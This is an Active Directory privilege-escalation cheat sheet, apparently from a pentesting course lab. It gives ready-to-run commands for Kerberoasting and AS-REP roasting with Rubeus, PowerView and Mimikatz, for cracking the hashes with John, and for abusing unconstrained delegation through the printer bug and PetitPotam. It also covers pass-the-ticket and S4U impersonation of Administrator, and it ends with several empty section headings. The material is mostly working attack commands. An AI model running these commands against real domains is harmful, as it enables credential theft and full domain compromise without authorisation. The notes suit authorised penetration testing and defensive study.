
## AD Privilege Escalation

- [Kerberoasting](#kerberoasting)
    + [Using `Rubeus.exe`](#using--rubeusexe-)
    + [Using Mimikatz](#using-mimikatz)
- [Targeted Kerberoasting AS-REPs](#targeted-kerberoasting-as-reps)
    + [Enumerating accounts with Kerberos Preauth disabled](#enumerating-accounts-with-kerberos-preauth-disabled)
    + [Disable Kerberos Preauth](#disable-kerberos-preauth)
    + [ASREPRoast : Request Encrypted AS-REP for Offline Brute Force](#asreproast---request-encrypted-as-rep-for-offline-brute-force)
- [Targeted Kerberoasting Set SPN](#targeted-kerberoasting-set-spn)
- [Kerberos Delegation](#kerberos-delegation)
    + [Uncostrained Delegation](#uncostrained-delegation)
    + [Printer Bug](#printer-bug)
  * [Constrained Delegation](#constrained-delegation)

### Kerberoasting
---
```powershell
# Standard AD User. Get Domain Users SPN. Users that are for services
C:> . .\PowerView.ps1
C:> Get-DomainUser -SPN
# We require to use the 'serviceprincipalname'

# Using AD Module
C:> Get-ADUser -Filter {ServicePrincipalName ne ""$null ""} -Properties ServicePrincipalName
```
##### Using `Rubeus.exe`
```powershell
# Get kerberos stats
C:> Rubeus.exe /stats

# Use Rubeus to request a TGS for <user>
C:> Rubeus.exe kerberoast /user:<user> /simple /outfile:hashes.txt

# Accounts supporting only RC4 (Gives errors!)
C:> Rubeus.exe kerberoast /stats /rc4opsec
C:> Rubeus.exe kerberoast /user:<user> /simple /rc4opsec

# Kerberoast all possible accounts
C:> Rubeus.exe kerberoast /outfile:hashes.txt                  

# Crack with John. Adequate file before cracking
C:> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```
##### Using Mimikatz
```powershell
C:> Add-Type -AssemblyNAme System.IdentityModel

C:> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken 
    -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"

# Dump account hashes to a `.kirbi` files: asd@service_asdasd
C:> . .\Invoke-Mimikatz.ps1
C:> Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack using `tgsrepcrack.py`
C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>.kirbi
```
### Targeted Kerberoasting AS-REPs
---
##### Enumerating accounts with Kerberos Preauth disabled
```powershell
# PowerView
C:> Get-DomainUser -PreauthNotRequired -Verbose    

# AD Module
C:> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
##### Disable Kerberos Preauth
```powershell
C:> Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
C:> Get-DomainUser -PreauthNotRequired -Verbose    # Check
``` 
##### ASREPRoast 
```powershell
# Request Encrypted AS-REP for Offline Brute Force
C:> Get-ASREPHash -UserName <user> -Verbose

# Enumerate Users with KErberos preauth disabled
C:> Invoke-ASREPRoast -Verbose

# Crack using JTR
C:> john.exe --wordlist=C:\10k-worst-pass.txt C:\asrephashes.txt
```
### Targeted Kerberoasting Set SPN
---
With rights over a user, we can set a SPN to it, and then go for a AS-REPs attack.
```powershell
# Enumerate permissions for RDPUsers
C:> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Check if user already has a SPN
C:> Get-DomainUser -Identity <user> | select serviceprincipalname

# Set SPN for the user
C:> Set-DomainObject -Identity <user> | Set @{serviceprincipalname='ops/whatever1'}

# Kerberoast the user
C:> Rubeus.exe kerberoast /outfile:targetedhashes.txt
C:> john.exe /wordlist=C:\wordlist.txt C:\targetedhashes.txt
```

### Kerberos Delegation
---

#### Uncostrained Delegation
```powershell
# Find Server with Unconstraided Delegation Enabled
C:> . C:\AD\Tools\PowerView.ps1
C:> Get-DomainComputer -Unconstrained | select -ExpandProperty name
<host1>
<host_n>

# Compromise the server and wait uuser to connect to server and then dump tokens on .kirbi files
C:> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Reuse the exported ticket with PTT
C:> Invoke-Mimikatz -Command '"kerberos::ptt C:<ticket_file_name>.kirbi"'
```
- Requisite for elevation using this technique, is to compromise a user with Admin Rights on the host

##### Printer Bug
```powershell
# Need shell in the server to compromise
# Launch Rubeus listener to capture TGT from DC 
C:> Rubeus.exe monitor /targetuser:<dc-name>$ /interval:5 /nowrap

# From a shell on our host, force DC auth to the server to compromise
C:> MS-RPRN.exe \\<DC_fqdn_name> \\<server_to_compromise_fqdn>
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.     # This error is OK

# PetiPoam can be user as well. Does the same.
# USefull when no print spooler enabled
C:> PetitPotam.exe dcorp-appsrv dcorp-dc

# At this point, in Rubeus we got the TGT for DC auth.
# Copy the Base64EncodedTicket and use with Rubeus in a elevated shell from our host
C:> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
[*] Action: Import Ticket
[+] Ticket successfully imported!

# At this point we get a ticket for the DC User
# From here, a DC-Sync attack to DC to get krbtgt and also to enterprise DC.
```
#### Constrained Delegation
```powershell
# Get users with Constraied delegation
C:> . .\PowerView.ps1
C:> Get-DomainUser -TrustedToAuth

# Request a TGS for user as Domain Administrator for CIFS on host
C:> Rubeus.exe s4u /user:<user> /aes256:<user_aes_hash> /impersonateuser:Administrator /msdsspn:"CIFS/<host_fqdn>" /ptt
```
```powershell
# Get Computer Accounts with Constrained Delegation
C:> Get-DomainComputer -TrustedToAuth

# Impersonate User Administrator using the host account
C:> Rubeus.exe s4u /user:<host_account>$ /aes256:<host_aes_hash> /impersonateuser:Administrator /msdsspn:time/<host_Fqdn> /altservice:ldap /ptt
```
##### Resource Based RBCD


### DNSAdmins

### Across Trusts

##### Child to Parent

##### Across Forest

##### Across Domain Trusts AD CS

### MS SQL Servers
